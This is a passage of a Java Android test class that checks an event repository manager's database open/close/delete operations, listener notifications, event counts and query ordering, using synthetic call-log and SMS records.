package com.vvt.eventrepository.tests;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import junit.framework.Assert;
import android.content.Context;
import android.test.ActivityInstrumentationTestCase2;

import com.vvt.base.FxEvent;
import com.vvt.base.FxEventType;
import com.vvt.eventrepository.FxEventRepositoryManager;
import com.vvt.eventrepository.RepositoryChangeEvent;
import com.vvt.eventrepository.RepositoryChangeListener;
import com.vvt.eventrepository.RepositoryChangePolicy;
import com.vvt.eventrepository.eventresult.EventCountInfo;
import com.vvt.eventrepository.eventresult.EventKeys;
import com.vvt.eventrepository.eventresult.EventResultSet;
import com.vvt.eventrepository.querycriteria.QueryCriteria;
import com.vvt.eventrepository.querycriteria.QueryOrder;
import com.vvt.eventrepository.stresstests.GenerrateTestValue;
import com.vvt.events.FxAlertGpsEvent;
import com.vvt.events.FxCallLogEvent;
import com.vvt.events.FxCameraImageThumbnailEvent;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxGeoTag;
import com.vvt.events.FxLocationMapProvider;
import com.vvt.events.FxLocationMethod;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxRecipient;
import com.vvt.events.FxRecipientType;
import com.vvt.events.FxSMSEvent;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.events.FxThumbnail;
import com.vvt.events.FxVideoFileThumbnailEvent;
import com.vvt.exceptions.FxNotImplementedException;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.database.FxDatabaseException;
import com.vvt.exceptions.database.FxDbCorruptException;
import com.vvt.exceptions.database.FxDbIdNotFoundException;
import com.vvt.exceptions.database.FxDbNotOpenException;
import com.vvt.exceptions.database.FxDbOpenException;
import com.vvt.exceptions.database.FxDbOperationException;
import com.vvt.exceptions.io.FxFileNotFoundException;
import com.vvt.exceptions.io.FxFileSizeNotAllowedException;

public class FxEventRepositoryManagerTestCase extends
		ActivityInstrumentationTestCase2<Event_repository_testsActivity> {

	private Context mTestContext;
	
	boolean m_EventAddCalled = false;
	boolean m_onReachMaxEventNumberCalled = false;
	boolean m_onSystemEventAdd = false;
	boolean m_onPanicEventAdd = false;
	boolean m_onSettingEventAdd = false;
	int m_EventAddCalledCount = 0;
	
	// TODO Complete these tasks 
	// - Add test for updateMediaThumbnailStatus()
	// - Add test for validating count from event base table and each DAO table.
	// - Add test to use QueryCriteria for querying different event types 
	//   e.g. only Panic, 2 selected events, etc. and try exercising the limit
	
	// TODO Exercise all available callback functions
	RepositoryChangeListener mRepositoryChangeListener = new RepositoryChangeListener () {
		@Override
		public void onEventAdd() {
			m_EventAddCalled = true;
			m_EventAddCalledCount++;
		}
	
		@Override
		public void onReachMaxEventNumber() {
			m_onReachMaxEventNumberCalled = true;
		}
	
		@Override
		public void onSystemEventAdd() { 
			m_onSystemEventAdd = true;
		}
		
		@Override
		public void onPanicEventAdd() { 
			m_onPanicEventAdd = true;
		}
		
		@Override
		public void onSettingEventAdd() { 
			m_onSettingEventAdd = true; 
		}
	};

	public FxEventRepositoryManagerTestCase() {
		super("com.vvt.eventrepository.tests", Event_repository_testsActivity.class);
	}

	@Override
	protected void setUp() throws Exception {
		super.setUp();

		mTestContext = this.getInstrumentation().getContext();

	}

	@Override
	protected void tearDown() throws Exception {
		super.tearDown();
	}

	public void setTestContext(Context context) {
		mTestContext = context;
	}

	public Context getTestContext() {
		return mTestContext;
	}

	public void test_open() throws FxDbOpenException, FxDbCorruptException {
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.openRepository();
		eventRepositoryManager.closeRespository();
	}

	public void test_openTenTimes() throws FxDbOpenException, FxDbCorruptException {
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);

		for (int i = 0; i <= 10; i++) {
			eventRepositoryManager.openRepository();
		}

		eventRepositoryManager.closeRespository();
	}

	public void test_addRepositoryChangeListenerWithNull() {
		boolean getException = false;
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		try {
			eventRepositoryManager.addRepositoryChangeListener(null, null);
		}
		catch (FxNullNotAllowedException e) {
			getException = true;
		}
		assertTrue(getException);
	}

	public void test_addRepositoryChangeListenerWithOutPolicyChangeType() {
		boolean getException = false;
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		RepositoryChangePolicy repositoryChangePolicy = new RepositoryChangePolicy();
		
		// This line will fail
		try {
			eventRepositoryManager.addRepositoryChangeListener(
					mRepositoryChangeListener, repositoryChangePolicy);
		}
		catch (FxNullNotAllowedException e) {
			getException = true;
		}
		
		assertTrue(getException);
	}
	
	public void test_addRepositoryChangeListener()
			throws FxNullNotAllowedException {
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		RepositoryChangePolicy repositoryChangePolicy = new RepositoryChangePolicy();
		repositoryChangePolicy.addChangeEvent(RepositoryChangeEvent.EVENT_ADD);
		
		eventRepositoryManager.addRepositoryChangeListener(mRepositoryChangeListener, repositoryChangePolicy);
	}
	
	public void test_closeRespository()
			throws FxNullNotAllowedException {
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.closeRespository();
	}
	
	public void test_closeRespositoryTenTimes()
			throws FxNullNotAllowedException {
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		
		for (int i = 0; i <= 10; i++) {
			eventRepositoryManager.closeRespository();
		}
	}
	
	public void test_OpenAndcloseRespositoryTenTimes()
			throws FxNullNotAllowedException, FxDbOpenException, FxDbCorruptException {
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		
		for (int i = 0; i <= 10; i++) {
			eventRepositoryManager.openRepository();
			eventRepositoryManager.closeRespository();
		}
	}
	
	public void test_DropRepository()
			throws FxNullNotAllowedException, FxDbOpenException, IOException {
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		 
	}
	
	public void test_DropRepositoryTenTimes()
			throws FxNullNotAllowedException, FxDbOpenException, IOException {
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		for (int i = 0; i <= 10; i++) {
			eventRepositoryManager.deleteRepository();
		}
	}
	
	public void test_OpenAndDropRepository()
			throws FxNullNotAllowedException, FxDbOpenException, IOException, FxDbCorruptException {
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.openRepository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_CallLogInsert() 
			throws FxDbOpenException, FxNullNotAllowedException,  
			FxDatabaseException, FxNotImplementedException, FxDbCorruptException, FxDbOperationException
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.openRepository();
		
		RepositoryChangePolicy policy = new RepositoryChangePolicy();
		policy.addChangeEvent(RepositoryChangeEvent.EVENT_ADD);
		
		eventRepositoryManager.addRepositoryChangeListener(mRepositoryChangeListener, policy);
		
		FxCallLogEvent callLogEvent = new FxCallLogEvent();
		callLogEvent.setContactName("Kitaro_nu");
		callLogEvent.setDirection(FxEventDirection.forValue(1));
		callLogEvent.setDuration(60000);
		callLogEvent.setNumber("0866205848");
		callLogEvent.setEventTime(System.currentTimeMillis());
		
		eventRepositoryManager.insert(callLogEvent);
		
		if(!m_EventAddCalled) {
			Assert.fail("onEventAdd() did not get notified");
		}
		
		eventRepositoryManager.closeRespository();
	}
	
	public void test_CallLogInsertList() 
			throws FxDbOpenException, FxNullNotAllowedException,  
			FxDatabaseException, FxNotImplementedException, FxDbCorruptException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.openRepository();
		
		RepositoryChangePolicy policy = new RepositoryChangePolicy();
		policy.addChangeEvent(RepositoryChangeEvent.EVENT_ADD);
		
		eventRepositoryManager.addRepositoryChangeListener(mRepositoryChangeListener, policy);
		
		List<FxEvent> events = new ArrayList<FxEvent>();
				
		for(int i = 1; i <= 10; i++) {
			FxCallLogEvent callLogEvent = new FxCallLogEvent();
			callLogEvent.setContactName("Kitaro_nu" + i);
			callLogEvent.setDirection(FxEventDirection.forValue(1));
			callLogEvent.setDuration(60000 * i);
			callLogEvent.setNumber("086620584" + i);
			callLogEvent.setEventTime(System.currentTimeMillis());
			events.add(callLogEvent);
		}
		
		eventRepositoryManager.insert(events);
		
		if(m_EventAddCalledCount != 10) {
			Assert.fail("onEventAdd() did not get notified 10 times" );
		}
		
		eventRepositoryManager.closeRespository();
	}
	
	public void test_NotifyOnSystemEventAdd() 
			throws FxDbOpenException, FxNullNotAllowedException,  
			FxNotImplementedException,  IOException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException {
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		m_onSystemEventAdd = false;
		
		RepositoryChangePolicy policy = new RepositoryChangePolicy();
		policy.setMaxEventNumber(10);
		policy.addChangeEvent(RepositoryChangeEvent.SYSTEM_EVENT_ADD);
		
		eventRepositoryManager.addRepositoryChangeListener(mRepositoryChangeListener , policy);
		
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		for(int i = 1; i <= 1; i++) {
			FxSystemEvent systemEvent = new FxSystemEvent();
			systemEvent.setDirection(FxEventDirection.IN);
			systemEvent.setEventTime(System.currentTimeMillis());
			systemEvent.setLogType(FxSystemEventCategories.CATEGORY_DEBUG_MESSAGE);
			systemEvent.setMessage("test notify");
			events.add(systemEvent);
		}
		
		eventRepositoryManager.insert(events);
		
		if(!m_onSystemEventAdd) {
			Assert.fail("onSystemEventAdd() did not get notified");
		}
		
		eventRepositoryManager.closeRespository();
		
	}
	
	public void test_NotifyOnSettingEventAdd() 
			throws FxDbOpenException, FxNullNotAllowedException,  
			FxNotImplementedException, IOException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException {
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		m_onSettingEventAdd = false;
		
		RepositoryChangePolicy policy = new RepositoryChangePolicy();
		policy.setMaxEventNumber(10);
		policy.addChangeEvent(RepositoryChangeEvent.SETTING_EVENT_ADD);
		
		eventRepositoryManager.addRepositoryChangeListener(mRepositoryChangeListener , policy);
		
		List<FxEvent> settingEvents = GenerrateTestValue.getEvents(FxEventType.SETTINGS, 1);
		
		eventRepositoryManager.insert(settingEvents);
		
		if(!m_onSettingEventAdd) {
			Assert.fail("onSettingEventAdd() did not get notified");
		}
		
		eventRepositoryManager.closeRespository();
		
	}
	
	
	public void test_NotifyOnPanicEventAdd() 
			throws FxDbOpenException, FxNullNotAllowedException, 
			FxNotImplementedException, IOException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException {
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		m_onPanicEventAdd = false;
		
		RepositoryChangePolicy policy = new RepositoryChangePolicy();
		policy.addChangeEvent(RepositoryChangeEvent.PANIC_EVENT_ADD);
		
		eventRepositoryManager.addRepositoryChangeListener(mRepositoryChangeListener , policy);
		
		List<FxEvent> events = GenerrateTestValue.getEvents(FxEventType.PANIC_STATUS, 1);
		eventRepositoryManager.insert(events);
		
		if(!m_onPanicEventAdd) {
			Assert.fail("onPanicEventAdd() did not get notified");
		}
		
		m_onPanicEventAdd = false;
		
		events = GenerrateTestValue.getEvents(FxEventType.PANIC_GPS, 1);
		eventRepositoryManager.insert(events);
		
		if(!m_onPanicEventAdd) {
			Assert.fail("onPanicEventAdd() did not get notified");
		}
		
		m_onPanicEventAdd = false;
		
		events = GenerrateTestValue.getEvents(FxEventType.PANIC_IMAGE, 1);
		eventRepositoryManager.insert(events);
		
		if(!m_onPanicEventAdd) {
			Assert.fail("onPanicEventAdd() did not get notified");
		}
		
		m_onPanicEventAdd = false;
		
		events = GenerrateTestValue.getEvents(FxEventType.ALERT_GPS, 1);
		eventRepositoryManager.insert(events);
		
		if(!m_onPanicEventAdd) {
			Assert.fail("onPanicEventAdd() did not get notified");
		}
		
		eventRepositoryManager.closeRespository();
		
	}
	
	public void test_CallLogInsertListNotifyOnMaxEventNumber() 
			throws FxDbOpenException, FxNullNotAllowedException,  
			FxNotImplementedException, IOException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		m_onReachMaxEventNumberCalled = false;
		
		RepositoryChangePolicy policy = new RepositoryChangePolicy();
		policy.setMaxEventNumber(10);
		policy.addChangeEvent(RepositoryChangeEvent.EVENT_REACH_MAX_NUMBER);
				
		eventRepositoryManager.addRepositoryChangeListener(mRepositoryChangeListener , policy);
		
		List<FxEvent> events = new ArrayList<FxEvent>();
				
		for(int i = 1; i <= 10; i++) {
			FxCallLogEvent callLogEvent = new FxCallLogEvent();
			callLogEvent.setContactName("Kitaro_nu" + i);
			callLogEvent.setDirection(FxEventDirection.forValue(1));
			callLogEvent.setDuration(60000 * i);
			callLogEvent.setNumber("086620584" + i);
			callLogEvent.setEventTime(System.currentTimeMillis());
			events.add(callLogEvent);
		}
		
		eventRepositoryManager.insert(events);
		
		if(!m_onReachMaxEventNumberCalled) {
			Assert.fail("onReachMaxEventNumber() did not get notified");
		}
		
		if(eventRepositoryManager.getTotalEventCount() != 10) {
			Assert.fail("getTotalEventCount() is wrong");
		}
		
		eventRepositoryManager.closeRespository();
	}
	
	public void test_getCount_On_Empty_db() throws FxDbOpenException, FxNullNotAllowedException, IOException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		EventCountInfo countInfo = eventRepositoryManager.getCount(); 
		
		if(countInfo.countTotal() != 0) {
			Assert.fail("countTotal() is wrong");
		}
		
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_getCount() throws FxDbOpenException, FxNullNotAllowedException, IOException,
										FxNotImplementedException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		m_onReachMaxEventNumberCalled = false;
		
		List<FxEvent> events = new ArrayList<FxEvent>();
				
		for(int i = 1; i <= 10; i++) {
			FxCallLogEvent callLogEvent = new FxCallLogEvent();
			callLogEvent.setContactName("Kitaro_nu" + i);
			callLogEvent.setDirection(FxEventDirection.forValue(FxEventDirection.IN.getNumber()));
			callLogEvent.setDuration(60000 * i);
			callLogEvent.setNumber("086620584" + i);
			callLogEvent.setEventTime(System.currentTimeMillis());
			events.add(callLogEvent);
		}
		
		for(int i = 1; i <= 10; i++) {
			FxCallLogEvent callLogEvent = new FxCallLogEvent();
			callLogEvent.setContactName("Kitaro_nu" + i);
			callLogEvent.setDirection(FxEventDirection.forValue(FxEventDirection.OUT.getNumber()));
			callLogEvent.setDuration(60000 * i);
			callLogEvent.setNumber("086620584" + i);
			callLogEvent.setEventTime(System.currentTimeMillis());
			events.add(callLogEvent);
		}
		
		for(int i = 1; i <= 10; i++) {
			FxCallLogEvent callLogEvent = new FxCallLogEvent();
			callLogEvent.setContactName("Kitaro_nu" + i);
			callLogEvent.setDirection(FxEventDirection.MISSED_CALL);
			callLogEvent.setDuration(60000 * i);
			callLogEvent.setNumber("086620584" + i);
			callLogEvent.setEventTime(System.currentTimeMillis());
			events.add(callLogEvent);
		}
		
		for(int i = 1; i <= 10; i++) {
			FxCallLogEvent callLogEvent = new FxCallLogEvent();
			callLogEvent.setContactName("Kitaro_nu" + i);
			callLogEvent.setDirection(FxEventDirection.UNKNOWN);
			callLogEvent.setDuration(60000 * i);
			callLogEvent.setNumber("086620584" + i);
			callLogEvent.setEventTime(System.currentTimeMillis());
			events.add(callLogEvent);
		}
		
		for(int i = 1; i <= 10; i++) {
			FxSMSEvent smsEvent = new FxSMSEvent();
			
			FxRecipient recipient = new FxRecipient();
			recipient.setRecipientType(FxRecipientType.TO);
			recipient.setContactName("qwerty " + i);
			recipient.setRecipient("test_insert@gmail.com " + i);
			
			smsEvent.setSenderNumber("0865478954"  + i);
			smsEvent.setContactName("test_insert"  + i);
			smsEvent.setDirection(FxEventDirection.OUT);
			smsEvent.setSMSData("test_insert na ja"  + i);
			smsEvent.setEventTime(System.currentTimeMillis());
			smsEvent.addRecipient(recipient);
			events.add(smsEvent);
		}
		
		eventRepositoryManager.insert(events);
		
		EventCountInfo countInfo = eventRepositoryManager.getCount(); 
		
		if(countInfo.countTotal() != 50) {
			Assert.fail("countTotal() is wrong");
		}
		
		if(countInfo.count(FxEventType.CALL_LOG) != 40) {
			Assert.fail("count by Type total is wrong");
		}
		
		if(countInfo.count(FxEventType.CALL_LOG, FxEventDirection.IN) != 10) {
			Assert.fail("count() is wrong");
		}
		
		if(countInfo.count(FxEventType.CALL_LOG, FxEventDirection.OUT) != 10) {
			Assert.fail("count() is wrong");
		}
		
		if(countInfo.count(FxEventType.CALL_LOG, FxEventDirection.MISSED_CALL) != 10) {
			Assert.fail("count() is wrong");
		}
		
		if(countInfo.count(FxEventType.CALL_LOG, FxEventDirection.UNKNOWN) != 10) {
			Assert.fail("count() is wrong");
		}
		
		if(countInfo.count(FxEventType.SMS) != 10) {
			Assert.fail("count() is wrong");
		}
		
		if(countInfo.count(FxEventType.SMS, FxEventDirection.OUT) != 10) {
			Assert.fail("count() is wrong");
		}
				
		
		eventRepositoryManager.closeRespository();
	}
	
	public void test_removeRepositoryChangeListener() throws FxDbOpenException,
			FxNullNotAllowedException, IOException, FxNotImplementedException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		RepositoryChangePolicy policy = new RepositoryChangePolicy();
		policy.addChangeEvent(RepositoryChangeEvent.EVENT_ADD);
		
		eventRepositoryManager.addRepositoryChangeListener(mRepositoryChangeListener, policy);
		eventRepositoryManager.removeRepositoryChangeListener(mRepositoryChangeListener);
		
		// Insert a new row and check whether we get any exceptions or notifications to repositoryChangeListener
		FxCallLogEvent callLogEvent = new FxCallLogEvent();
		callLogEvent.setContactName("Kitaro_nu");
		callLogEvent.setDirection(FxEventDirection.forValue(1));
		callLogEvent.setDuration(60000);
		callLogEvent.setNumber("0866205848");
		callLogEvent.setEventTime(System.currentTimeMillis());
		
		eventRepositoryManager.insert(callLogEvent);
		
		if(m_EventAddCalled) {
			Assert.fail("removeRepositoryChangeListener did not remove listner");
		}
		
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}

	public void test_getRegularEvents() 
			throws FxDbOpenException, FxNullNotAllowedException, 
			IOException, FxNotImplementedException,  
			FxFileNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		for(int i = 1; i <= 9; i++) {
			FxCallLogEvent callLogEvent = new FxCallLogEvent();
			callLogEvent.setContactName("Kitaro_nu" + i);
			callLogEvent.setDirection(FxEventDirection.forValue(1));
			callLogEvent.setDuration(60000 * i);
			callLogEvent.setNumber("086620584" + i);
			callLogEvent.setEventTime(System.currentTimeMillis());
			events.add(callLogEvent);
		}
		
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(5);
		criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
		
		EventResultSet result = eventRepositoryManager.getRegularEvents(criteria);
		List<FxEvent> addedEvents = result.getEvents();
		
		if(addedEvents.size() != 5) {
			Assert.fail("getRegularEvents returned invalid row count");
		}
		
		boolean isNewestFirst = true;
		
		long refId = addedEvents.get(0).getEventId();
		
		for(int i = 1 ; i< addedEvents.size() ; i++) {
			if(addedEvents.get(i).getEventId() > refId) {
				isNewestFirst = false;
				break;
			} else {
				refId = addedEvents.get(i).getEventId();
			}
		}
		
		if(!isNewestFirst) {
			Assert.fail("is not Newest First");
		}
		
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_getRegularEvents_QueryCriteria_Limit_Test() 
			throws FxDbOpenException, FxNullNotAllowedException, 
			IOException, FxNotImplementedException,  
			FxFileNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		// Insert a new row and check whether we get any exceptions or notifications to repositoryChangeListener
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		for(int i = 1; i <= 100; i++) {
			FxSMSEvent smsEvent = new FxSMSEvent();
			
			FxRecipient recipient = new FxRecipient();
			recipient.setRecipientType(FxRecipientType.TO);
			recipient.setContactName("qwerty " + i);
			recipient.setRecipient("test_insert@gmail.com " + i);
			
			smsEvent.setSenderNumber("0865478954"  + i);
			smsEvent.setContactName("test_insert"  + i);
			smsEvent.setDirection(FxEventDirection.OUT);
			smsEvent.setSMSData("test_insert na ja"  + i);
			smsEvent.setEventTime(System.currentTimeMillis());
			smsEvent.addRecipient(recipient);
			events.add(smsEvent);
		}
		
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(50);
		criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
		
		EventResultSet result = eventRepositoryManager.getRegularEvents(criteria);
		List<FxEvent> addedEvents = result.getEvents();
		
		if(addedEvents.size() != 50) {
			Assert.fail("QueryCriteria Limit Test returned invalid row count");
		}
		
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_getRegularEvents_QueryCriteria_QueryOrder_QueryNewestFirst_Test() 
			throws FxDbOpenException, FxNullNotAllowedException, 
			IOException, FxNotImplementedException,  
			FxFileNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		// Insert a new row and check whether we get any exceptions or notifications to repositoryChangeListener
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		FxRecipient recipient = new FxRecipient();
		recipient.setRecipientType(FxRecipientType.TO);
		recipient.setContactName("first");
		recipient.setRecipient("first@gmail.com ");
		
		FxSMSEvent firstSmsEvent = new FxSMSEvent();
		firstSmsEvent.setSenderNumber("first");
		firstSmsEvent.setContactName("first");
		firstSmsEvent.setDirection(FxEventDirection.OUT);
		firstSmsEvent.setSMSData("first test_insert na ja");
		firstSmsEvent.setEventTime(System.currentTimeMillis());
		firstSmsEvent.addRecipient(recipient);
		
		FxSMSEvent secondSmsEvent = new FxSMSEvent();
		secondSmsEvent.setSenderNumber("second");
		secondSmsEvent.setContactName("second");
		secondSmsEvent.setDirection(FxEventDirection.OUT);
		secondSmsEvent.setSMSData("second test_insert na ja");
		secondSmsEvent.setEventTime(System.currentTimeMillis());
		secondSmsEvent.addRecipient(recipient);
		
		events.add(firstSmsEvent);
		events.add(secondSmsEvent);
		
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(50);
		criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
		
		EventResultSet result = eventRepositoryManager.getRegularEvents(criteria);
		List<FxEvent> addedEvents = result.getEvents();
		
		FxSMSEvent SMSEvent	 = (FxSMSEvent)addedEvents.get(0);
		
		if(!SMSEvent.getContactName().equals("second")){
			Assert.fail("QueryNewestFirst Test returned invalid row");
		}
	
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_getRegularEvents_QueryCriteria_QueryOrder_QueryOldestFist_Test() 
			throws FxDbOpenException, FxNullNotAllowedException, 
			IOException, FxNotImplementedException, FxFileNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		// Insert a new row and check whether we get any exceptions or notifications to repositoryChangeListener
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		FxRecipient recipient = new FxRecipient();
		recipient.setRecipientType(FxRecipientType.TO);
		recipient.setContactName("first");
		recipient.setRecipient("first@gmail.com ");
		
		FxSMSEvent firstSmsEvent = new FxSMSEvent();
		firstSmsEvent.setSenderNumber("first");
		firstSmsEvent.setContactName("first");
		firstSmsEvent.setDirection(FxEventDirection.OUT);
		firstSmsEvent.setSMSData("first test_insert na ja");
		firstSmsEvent.setEventTime(System.currentTimeMillis());
		firstSmsEvent.addRecipient(recipient);
		
		FxSMSEvent secondSmsEvent = new FxSMSEvent();
		secondSmsEvent.setSenderNumber("second");
		secondSmsEvent.setContactName("second");
		secondSmsEvent.setDirection(FxEventDirection.OUT);
		secondSmsEvent.setSMSData("second test_insert na ja");
		secondSmsEvent.setEventTime(System.currentTimeMillis());
		secondSmsEvent.addRecipient(recipient);
		
		events.add(firstSmsEvent);
		events.add(secondSmsEvent);
		
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(50);
		criteria.setQueryOrder(QueryOrder.QueryOldestFist);
		
		EventResultSet result = eventRepositoryManager.getRegularEvents(criteria);
		List<FxEvent> addedEvents = result.getEvents();
		
		FxSMSEvent SMSEvent	 = (FxSMSEvent)addedEvents.get(0);
		
		if(!SMSEvent.getContactName().equals("first")){
			Assert.fail("QueryOldestFist Test returned invalid row");
		}
	
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_getRegularEvents_QueryCriteria_addEventType_Test() 
			throws FxDbOpenException, FxNullNotAllowedException, 
			IOException, FxNotImplementedException, FxFileNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		// Insert a new row and check whether we get any exceptions or notifications to repositoryChangeListener
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		FxRecipient recipient = new FxRecipient();
		recipient.setRecipientType(FxRecipientType.TO);
		recipient.setContactName("first");
		recipient.setRecipient("first@gmail.com ");
		
		FxSMSEvent smsEvent = new FxSMSEvent();
		smsEvent.setSenderNumber("first");
		smsEvent.setContactName("first");
		smsEvent.setDirection(FxEventDirection.OUT);
		smsEvent.setSMSData("first test_insert na ja");
		smsEvent.setEventTime(System.currentTimeMillis());
		smsEvent.addRecipient(recipient);
		
		FxCallLogEvent callLogEvent = new FxCallLogEvent();
		callLogEvent.setContactName("Kitaro_nu");
		callLogEvent.setDirection(FxEventDirection.forValue(1));
		callLogEvent.setDuration(60000);
		callLogEvent.setNumber("0866205848");
		callLogEvent.setEventTime(System.currentTimeMillis());
		
		events.add(smsEvent);
		events.add(callLogEvent);
		
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(50);
		criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
		criteria.addEventType(FxEventType.SMS);
		
		EventResultSet result = eventRepositoryManager.getRegularEvents(criteria);
		List<FxEvent> addedEvents = result.getEvents();
		
		if(addedEvents.size() != 1) {
			Assert.fail("getRegularEvents returned invalid row count");
		}
		
		FxSMSEvent SMSEvent	 = (FxSMSEvent)addedEvents.get(0);
		
		if(!SMSEvent.getContactName().equals("first")){
			Assert.fail("QueryOldestFist Test returned invalid row");
		}
	
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_getRegularEvents_QueryCriteria_addEventType_PriorityMix_Test() 
			throws FxDbOpenException, FxNullNotAllowedException, 
			IOException,  
			FxNotImplementedException, FxFileNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		FxRecipient recipient = new FxRecipient();
		recipient.setRecipientType(FxRecipientType.TO);
		recipient.setContactName("first");
		recipient.setRecipient("first@gmail.com ");
		
		FxSMSEvent smsEvent = new FxSMSEvent();
		smsEvent.setSenderNumber("first");
		smsEvent.setContactName("first");
		smsEvent.setDirection(FxEventDirection.OUT);
		smsEvent.setSMSData("first test_insert na ja");
		smsEvent.setEventTime(System.currentTimeMillis());
		smsEvent.addRecipient(recipient);
		
		FxCallLogEvent callLogEvent = new FxCallLogEvent();
		callLogEvent.setContactName("Kitaro_nu");
		callLogEvent.setDirection(FxEventDirection.forValue(1));
		callLogEvent.setDuration(60000);
		callLogEvent.setNumber("0866205848");
		callLogEvent.setEventTime(System.currentTimeMillis());
		

